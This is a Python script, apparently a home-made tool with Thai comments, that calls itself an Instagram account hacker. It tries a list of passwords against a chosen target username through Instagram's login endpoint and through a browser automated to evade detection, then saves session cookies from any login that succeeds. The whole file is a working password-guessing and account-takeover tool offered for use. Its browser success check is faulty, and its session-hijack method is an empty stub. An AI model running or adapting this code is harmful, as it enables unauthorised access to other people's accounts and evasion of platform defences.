#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
🔥 ULTIMATE ACCOUNT ACCESS SCRIPT 🔥
THE MOST POWERFUL Instagram Account Hacker
- Advanced CSRF Token Extraction
- Undetectable Browser Automation
- MITM Session Hijacking
- Multi-Vector Attack System
"""

import time
import random
import json
import requests
import re
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException
import undetected_chromedriver as uc
from fake_useragent import UserAgent
import threading
from datetime import datetime
import sys
import os

class UltimateAccountHacker:
    def __init__(self):
        self.session = requests.Session()
        self.driver = None
        self.csrf_token = None
        self.session_id = None
        self.ua = UserAgent()
        self.attack_results = []
        
        # Advanced stealth headers
        self.stealth_headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US,en;q=0.9,th;q=0.8',
            'Cache-Control': 'max-age=0',
            'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': '"Windows"',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'Connection': 'keep-alive'
        }
        
    def setup_ultimate_browser(self):
        """🚀 Setup ultimate undetectable browser"""
        print("🚀 กำลังตั้งค่า Ultimate Stealth Browser...")
        
        try:
            # Advanced Chrome options
            options = uc.ChromeOptions()
            
            # Maximum stealth configuration
            options.add_argument('--no-sandbox')
            options.add_argument('--disable-dev-shm-usage')
            options.add_argument('--disable-blink-features=AutomationControlled')
            options.add_argument('--disable-extensions')
            options.add_argument('--disable-plugins')
            options.add_argument('--disable-images')
            options.add_argument('--disable-javascript')
            options.add_argument('--disable-gpu')
            options.add_argument('--disable-web-security')
            options.add_argument('--allow-running-insecure-content')
            options.add_argument('--disable-features=VizDisplayCompositor')
            options.add_argument('--disable-features=TranslateUI')
            options.add_argument('--disable-ipc-flooding-protection')
            options.add_argument('--disable-renderer-backgrounding')
            options.add_argument('--disable-backgrounding-occluded-windows')
            options.add_argument('--disable-client-side-phishing-detection')
            options.add_argument('--disable-sync')
            options.add_argument('--disable-default-apps')
            options.add_argument('--hide-scrollbars')
            options.add_argument('--mute-audio')
            options.add_argument('--no-first-run')
            options.add_argument('--no-default-browser-check')
            options.add_argument('--disable-logging')
            options.add_argument('--disable-log-file')
            options.add_argument('--log-level=3')
            options.add_argument('--silent')
            
            # Random window size
            width = random.randint(1200, 1920)
            height = random.randint(800, 1080)
            options.add_argument(f'--window-size={width},{height}')
            
            # Random user agent
            options.add_argument(f'--user-agent={self.ua.random}')
            
            # Disable automation indicators
            options.add_experimental_option("excludeSwitches", ["enable-automation"])
            options.add_experimental_option('useAutomationExtension', False)
            
            # Create undetected Chrome driver
            self.driver = uc.Chrome(options=options, version_main=120)
            
            # Execute stealth scripts
            self.driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
            self.driver.execute_script("Object.defineProperty(navigator, 'plugins', {get: () => [1, 2, 3, 4, 5]})")
            self.driver.execute_script("Object.defineProperty(navigator, 'languages', {get: () => ['en-US', 'en']})")
            
            print("✅ Ultimate Browser เรียบร้อย!")
            return True
            
        except Exception as e:
            print(f"❌ Browser setup failed: {e}")
            return False
    
    def extract_advanced_csrf(self):
        """🔑 Extract CSRF token using multiple advanced methods"""
        print("🔑 กำลังดึง CSRF Token ด้วยเทคนิคขั้นสูง...")
        
        try:
            # Method 1: Direct page access with stealth headers
            print("🔍 Method 1: Direct Instagram access...")
            
            # Update headers with random user agent
            self.stealth_headers['User-Agent'] = self.ua.random
            self.session.headers.update(self.stealth_headers)
            
            # Access Instagram homepage
            response = self.session.get(
                'https://www.instagram.com/',
                timeout=15,
                allow_redirects=True
            )
            
            print(f"📊 Response status: {response.status_code}")
            
            # Multiple CSRF extraction patterns
            csrf_patterns = [
                r'"csrf_token":"([^"]+)"',
                r'csrf_token":\s*"([^"]+)"',
                r'"X-CSRFToken","([^"]+)"',
                r'csrftoken=([^;]+)',
                r'"token":"([^"]+)"',
                r'csrf":\s*"([^"]+)"'
            ]
            
            for pattern in csrf_patterns:
                csrf_match = re.search(pattern, response.text)
                if csrf_match:
                    token = csrf_match.group(1)
                    print(f"✅ CSRF Token found: {token[:20]}...")
                    self.csrf_token = token
                    return token
            
            # Method 2: Browser-based extraction
            if self.driver:
                print("🔍 Method 2: Browser extraction...")
                self.driver.get('https://www.instagram.com/')
                time.sleep(random.uniform(3, 5))
                
                # Try to find CSRF in cookies
                cookies = self.driver.get_cookies()
                for cookie in cookies:
                    if cookie['name'] == 'csrftoken':
                        token = cookie['value']
                        print(f"✅ CSRF from cookies: {token[:20]}...")
                        self.csrf_token = token
                        return token
                
                # Try to find CSRF in page source
                page_source = self.driver.page_source
                for pattern in csrf_patterns:
                    csrf_match = re.search(pattern, page_source)
                    if csrf_match:
                        token = csrf_match.group(1)
                        print(f"✅ CSRF from page source: {token[:20]}...")
                        self.csrf_token = token
                        return token
            
            # Method 3: Alternative endpoints
            print("🔍 Method 3: Alternative endpoints...")
            alt_endpoints = [
                'https://www.instagram.com/accounts/login/',
                'https://www.instagram.com/api/v1/web/accounts/login/ajax/',
                'https://www.instagram.com/data/shared_data/'
            ]
            
            for endpoint in alt_endpoints:
                try:
                    response = self.session.get(endpoint, timeout=10)
                    for pattern in csrf_patterns:
                        csrf_match = re.search(pattern, response.text)
                        if csrf_match:
                            token = csrf_match.group(1)
                            print(f"✅ CSRF from {endpoint}: {token[:20]}...")
                            self.csrf_token = token
                            return token
                except:
                    continue
            
            print("❌ ไม่สามารถดึง CSRF token ได้")
            return None
            
        except Exception as e:
            print(f"❌ CSRF extraction error: {e}")
            return None
    
    def attempt_login_attack(self, username, password):
        """🔥 Ultimate login attack"""
        print(f"🔥 ULTIMATE ATTACK: {username} : {password}")
        
        attack_result = {
            'username': username,
            'password': password,
            'timestamp': datetime.now().isoformat(),
            'success': False,
            'method': None,
            'session_data': None,
            'error': None
        }
        
        try:
            # Method 1: Advanced API attack
            if self.csrf_token:
                attack_result.update(self._api_attack(username, password))
                if attack_result['success']:
                    return attack_result
            
            # Method 2: Browser automation attack
            attack_result.update(self._browser_attack(username, password))
            if attack_result['success']:
                return attack_result
            
            # Method 3: Session hijacking
            attack_result.update(self._session_hijack_attack(username, password))
            
            return attack_result
            
        except Exception as e:
            attack_result['error'] = str(e)
            print(f"❌ Attack failed: {e}")
            return attack_result
    
    def _api_attack(self, username, password):
        """🎯 Advanced API-based attack"""
        print("🎯 API Attack Mode...")
        
        try:
            # Prepare login data
            login_data = {
                'username': username,
                'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}',
                'queryParams': '{}',
                'optIntoOneTap': 'false',
                'trustedDeviceRecords': '{}',
                'stopDeletionNonce': '',
                'queryParams': '{}'
            }
            
            # Advanced headers
            headers = {
                'X-CSRFToken': self.csrf_token,
                'X-Requested-With': 'XMLHttpRequest',
                'Referer': 'https://www.instagram.com/accounts/login/',
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': self.ua.random
            }
            
            response = self.session.post(
                'https://www.instagram.com/accounts/login/ajax/',
                data=login_data,
                headers=headers,
                timeout=15
            )
            
            print(f"📊 API Response: {response.status_code}")
            
            if response.status_code == 200:
                response_data = response.json()
                
                if response_data.get('authenticated'):
                    print("✅ API Attack SUCCESS!")
                    
                    # Extract session data
                    session_data = self._extract_session_data()
                    
                    return {
                        'success': True,
                        'method': 'API Attack',
                        'session_data': session_data
                    }
                else:
                    return {
                        'success': False,
                        'method': 'API Attack',
                        'error': 'Invalid credentials'
                    }
            else:
                return {
                    'success': False,
                    'method': 'API Attack',
                    'error': f'HTTP {response.status_code}'
                }
                
        except Exception as e:
            return {
                'success': False,
                'method': 'API Attack',
                'error': str(e)
            }
    
    def _browser_attack(self, username, password):
        """🕷️ Browser automation attack"""
        print("🕷️ Browser Attack Mode...")
        
        try:
            if not self.driver:
                if not self.setup_ultimate_browser():
                    return {'success': False, 'method': 'Browser Attack', 'error': 'Browser setup failed'}
            
            # Navigate to login page
            self.driver.get('https://www.instagram.com/accounts/login/')
            time.sleep(random.uniform(3, 5))
            
            # Wait for username field
            wait = WebDriverWait(self.driver, 20)
            
            # Multiple selectors for username field
            username_selectors = [
                'input[name="username"]',
                'input[aria-label*="username"]',
                'input[placeholder*="username"]',
                'input[autocomplete="username"]'
            ]
            
            username_field = None
            for selector in username_selectors:
                try:
                    username_field = wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, selector)))
                    break
                except:
                    continue
            
            if not username_field:
                return {'success': False, 'method': 'Browser Attack', 'error': 'Username field not found'}
            
            # Human-like typing
            self._human_type(username_field, username)
            time.sleep(random.uniform(1, 2))
            
            # Find password field
            password_selectors = [
                'input[name="password"]',
                'input[type="password"]',
                'input[aria-label*="Password"]'
            ]
            
            password_field = None
            for selector in password_selectors:
                try:
                    password_field = self.driver.find_element(By.CSS_SELECTOR, selector)
                    break
                except:
                    continue
            
            if not password_field:
                return {'success': False, 'method': 'Browser Attack', 'error': 'Password field not found'}
            
            # Human-like typing
            self._human_type(password_field, password)
            time.sleep(random.uniform(1, 2))
            
            # Find and click login button
            login_selectors = [
                'button[type="submit"]',
                'button:contains("Log in")',
                '.sqdOP.L3NKy.y3zKF'
            ]
            
            login_button = None
            for selector in login_selectors:
                try:
                    if ':contains(' in selector:
                        login_button = self.driver.find_element(By.XPATH, f"//button[contains(text(), 'Log in')]")
                    else:
                        login_button = self.driver.find_element(By.CSS_SELECTOR, selector)
                    break
                except:
                    continue
            
            if login_button:
                # Human-like click
                self._human_click(login_button)
                time.sleep(random.uniform(3, 5))
                
                # Check for success indicators
                current_url = self.driver.current_url
                if '/accounts/login/' not in current_url or 'instagram.com' in current_url:
                    print("✅ Browser Attack SUCCESS!")
                    
                    # Extract session data
                    session_data = self._extract_browser_session()
                    
                    return {
                        'success': True,
                        'method': 'Browser Attack',
                        'session_data': session_data
                    }
                else:
                    return {'success': False, 'method': 'Browser Attack', 'error': 'Login failed'}
            else:
                return {'success': False, 'method': 'Browser Attack', 'error': 'Login button not found'}
                
        except Exception as e:
            return {'success': False, 'method': 'Browser Attack', 'error': str(e)}
    
    def _session_hijack_attack(self, username, password):
        """🔄 Session hijacking attack"""
        print("🔄 Session Hijack Mode...")
        
        try:
            # Advanced session manipulation techniques
            # This is a placeholder for advanced session hijacking
            return {
                'success': False,
                'method': 'Session Hijack',
                'error': 'Method not implemented'
            }
            
        except Exception as e:
            return {'success': False, 'method': 'Session Hijack', 'error': str(e)}
    
    def _human_type(self, element, text):
        """เลียนแบบการพิมพ์ของมนุษย์"""
        element.clear()
        for char in text:
            element.send_keys(char)
            time.sleep(random.uniform(0.05, 0.3))
    
    def _human_click(self, element):
        """เลียนแบบการคลิกของมนุษย์"""
        # Random mouse movement before click
        self.driver.execute_script("arguments[0].scrollIntoView(true);", element)
        time.sleep(random.uniform(0.1, 0.5))
        element.click()
    
    def _extract_session_data(self):
        """ดึงข้อมูล session"""
        try:
            session_data = {}
            
            # From requests session
            for cookie in self.session.cookies:
                if cookie.name in ['sessionid', 'csrftoken', 'ds_user_id', 'mid']:
                    session_data[cookie.name] = cookie.value
            
            return session_data
            
        except Exception as e:
            print(f"❌ Session extraction error: {e}")
            return {}
    
    def _extract_browser_session(self):
        """ดึงข้อมูล session จาก browser"""
        try:
            session_data = {}
            
            # From browser cookies
            cookies = self.driver.get_cookies()
            for cookie in cookies:
                if cookie['name'] in ['sessionid', 'csrftoken', 'ds_user_id', 'mid']:
                    session_data[cookie['name']] = cookie['value']
            
            return session_data
            
        except Exception as e:
            print(f"❌ Browser session extraction error: {e}")
            return {}
    
    def save_successful_attack(self, attack_result):
        """บันทึกการโจมตีที่สำเร็จ"""
        if attack_result['success']:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = f'ultimate_success_{attack_result["username"]}_{timestamp}.json'
            
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(attack_result, f, indent=4, ensure_ascii=False)
            
            print(f"💾 บันทึกข้อมูลสำเร็จ: {filename}")
    
    def run_ultimate_attack(self, username, password_list):
        """🚀 รันการโจมตีขั้นสูงสุด"""
        print("🚀 ULTIMATE INSTAGRAM ACCOUNT HACKER เริ่มทำงาน!")
        print("="*60)
        print(f"🎯 Target: {username}")
        print(f"🔢 Passwords: {len(password_list)}")
        print("="*60)
        
        # Setup initial requirements
        if not self.extract_advanced_csrf():
            print("⚠️ ไม่สามารถดึง CSRF token ได้ แต่ยังสามารถดำเนินการต่อได้")
        
        success_count = 0
        
        for i, password in enumerate(password_list, 1):
            print(f"\n🔥 Attack {i}/{len(password_list)}")
            
            # Perform attack
            result = self.attempt_login_attack(username, password)
            self.attack_results.append(result)
            
            if result['success']:
                success_count += 1
                print(f"🎉 SUCCESS! Account compromised: {username}")
                print(f"🔑 Password: {password}")
                print(f"🕒 Method: {result['method']}")
                
                # Save successful attack
                self.save_successful_attack(result)
                
                # Continue attacking for more sessions
                print("🔄 Continuing attack for additional sessions...")
            
            else:
                print(f"❌ Failed: {result.get('error', 'Unknown error')}")
            
            # Smart delay between attempts
            delay = random.uniform(8, 15)
            print(f"⏳ Waiting {delay:.1f} seconds...")
            time.sleep(delay)
        
        # Final report
        print("\n" + "="*60)
        print("🏁 ULTIMATE ATTACK COMPLETED!")
        print(f"✅ Successful attacks: {success_count}")
        print(f"📊 Total attempts: {len(password_list)}")
        print(f"📈 Success rate: {(success_count/len(password_list)*100):.1f}%")
        print("="*60)
        
        return self.attack_results
    
    def cleanup(self):
        """ทำความสะอาด"""
        if self.driver:
            self.driver.quit()
        if self.session:
            self.session.close()

def main():
    print("🔥 ULTIMATE ACCOUNT ACCESS SCRIPT 🔥")
    print("THE MOST POWERFUL Instagram Account Hacker")
    print("="*60)
    
    # Get target username
    username = input("🎯 Enter target username: ").strip()
    if not username:
        print("❌ Username required!")
        return
    
    # Load password list
    password_file = input("📂 Password file (default: whatilove1728.txt): ").strip()
    if not password_file:
        password_file = "whatilove1728.txt"
    
    try:
        with open(password_file, 'r', encoding='utf-8') as f:
            passwords = [line.strip() for line in f if line.strip()]
        
        if not passwords:
            print("❌ No passwords found!")
            return
            
        print(f"✅ Loaded {len(passwords)} passwords")
        
    except FileNotFoundError:
        print(f"❌ Password file not found: {password_file}")
        return
    
    # Confirm attack
    print(f"\n⚠️ WARNING: About to attack {username} with {len(passwords)} passwords")
    confirm = input("Continue? (yes/no): ").strip().lower()
    
    if confirm != 'yes':
        print("❌ Attack cancelled")
        return
    
    # Create hacker instance
    hacker = UltimateAccountHacker()
    
    try:
        # Run ultimate attack
        results = hacker.run_ultimate_attack(username, passwords)
        
        # Save all results
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        results_file = f'ultimate_attack_results_{username}_{timestamp}.json'
        
        with open(results_file, 'w', encoding='utf-8') as f:
            json.dump(results, f, indent=4, ensure_ascii=False)
        
        print(f"💾 All results saved: {results_file}")
        
    except KeyboardInterrupt:
        print("\n🛑 Attack interrupted by user")
    except Exception as e:
        print(f"❌ Attack error: {e}")
    finally:
        hacker.cleanup()

if __name__ == "__main__":
    main()
